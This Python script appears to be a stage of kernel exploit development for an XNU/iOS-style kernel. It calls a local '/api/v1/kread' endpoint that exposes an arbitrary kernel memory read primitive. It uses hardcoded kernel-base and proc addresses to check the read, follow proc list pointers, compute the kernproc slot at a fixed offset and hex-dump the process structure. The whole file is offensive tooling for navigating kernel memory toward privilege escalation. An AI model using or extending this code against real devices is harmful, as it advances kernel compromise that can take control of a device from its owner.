#!/usr/bin/env python3
import os
import sys
import struct
import requests

API_BASE = os.environ.get('API_BASE', 'http://127.0.0.1:8000')
TIMEOUT = 5

def post_kread(addr, size):
    url = API_BASE + '/api/v1/kread'
    try:
        r = requests.post(url, json={'addr': hex(addr), 'size': size}, timeout=TIMEOUT)
        r.raise_for_status()
    except requests.exceptions.RequestException as e:
        print('[ERROR] kread request failed:', e)
        sys.exit(1)
    # parse JSON
    try:
        data = r.json()
    except Exception as e:
        print('[ERROR] Failed to parse JSON response:', e)
        sys.exit(1)
    # Prefer 'value' (hex string) or 'data'
    if 'value' in data and isinstance(data['value'], str):
        hexs = data['value'][2:] if data['value'].startswith('0x') else data['value']
        # ensure even length
        if len(hexs) % 2:
            hexs = '0' + hexs
        raw = bytes.fromhex(hexs)
    elif 'data' in data:
        d = data['data']
        if isinstance(d, str):
            hexs = d[2:] if d.startswith('0x') else d
            raw = bytes.fromhex(hexs)
        elif isinstance(d, list):
            raw = bytes(d)
        else:
            print('[ERROR] Unsupported data format in kread')
            sys.exit(1)
    else:
        print('[ERROR] kread: missing value/data in response')
        sys.exit(1)
    # Return exact requested size (pad if short)
    if len(raw) < size:
        raw = raw.ljust(size, b'\x00')
    return raw[:size]

def print_hexdump(base_addr, data, width=16):
    for i in range(0, len(data), width):
        chunk = data[i:i+width]
        hexs = ' '.join(f'{b:02x}' for b in chunk)
        print(f'Offset 0x{i:02X}: {hexs}')

def to_u64_le(b):
    return int.from_bytes(b, 'little')

def to_u32_le(b):
    return int.from_bytes(b, 'little')

def main():
    print('Running step_by_step_probe_v2')
    kernel_base = os.environ.get('KERNEL_BASE', '0xfffffff011f68000')
    ourproc = os.environ.get('OURPROC', '0xffffffe224f88aa0')
    try:
        kernel_base = int(kernel_base, 0)
        ourproc = int(ourproc, 0)
    except Exception as e:
        print('[ERROR] Invalid KERNEL_BASE or OURPROC:', e)
        sys.exit(1)

    # Step 1: PID at ourproc + 0x28 (read 4 bytes)
    addr_pid = ourproc + 0x28
    print(f'Step 1: Read 4 bytes at ourproc+0x28 -> 0x{addr_pid:016x}')
    bpid = post_kread(addr_pid, 4)
    pid_val = to_u32_le(bpid)
    status = 'OK' if pid_val > 0 and pid_val < 200000 else 'FAIL'
    print(f'PID Check: [{status}] (Value: {pid_val})')

    # Step 2: try le_next at +0x0 and +0x8
    addr0 = ourproc + 0x0
    addr8 = ourproc + 0x8
    print(f'Step 2: Read 8 bytes at ourproc+0x0 -> 0x{addr0:016x}')
    b0 = post_kread(addr0, 8)
    p0 = to_u64_le(b0)
    print(f'Next Proc Ptr (@+0x0): 0x{p0:016x}')
    print(f'Step 2: Read 8 bytes at ourproc+0x8 -> 0x{addr8:016x}')
    b8 = post_kread(addr8, 8)
    p8 = to_u64_le(b8)
    print(f'Next Proc Ptr (@+0x8): 0x{p8:016x}')
    if not (hex(p0).startswith('0xffff') or hex(p8).startswith('0xffff')):
        print('Pointer structure mismatch')

    # Step 3: kernproc slot
    kernproc = kernel_base + 0x96B928
    slot_addr = kernproc + 0x0
    print(f'Step 3: Compute kernproc = kernel_base + 0x96B928 = 0x{kernproc:016x}')
    print(f'Step 3: Read 8 bytes at kernproc+0x0 -> 0x{slot_addr:016x}')
    bslot = post_kread(slot_addr, 8)
    slot_val = to_u64_le(bslot)
    print(f'Kernproc Slot Content: 0x{slot_val:016x}')

    # Step 4: if slot_val valid, read PID at slot_val + 0x28
    if not hex(slot_val).startswith('0xffff'):
        print('Kernproc slot content is not a kernel pointer; aborting Step 4')
        # Before exit, dump first 128 bytes of ourproc for manual inspection
        print('Dumping first 128 bytes of ourproc for analysis:')
        data = post_kread(ourproc, 128)
        print_hexdump(ourproc, data)
        sys.exit(1)
    pid_addr2 = slot_val + 0x28
    print(f'Step 4: Read PID at 0x{pid_addr2:016x}')
    bpid2 = post_kread(pid_addr2, 4)
    pid2 = to_u32_le(bpid2)
    print(f'First Process PID: {pid2}')

    # Also produce hex dump of ourproc for visual inspection
    print('Hex dump of ourproc (128 bytes):')
    data = post_kread(ourproc, 128)
    print_hexdump(ourproc, data)

if __name__ == '__main__':
    main()
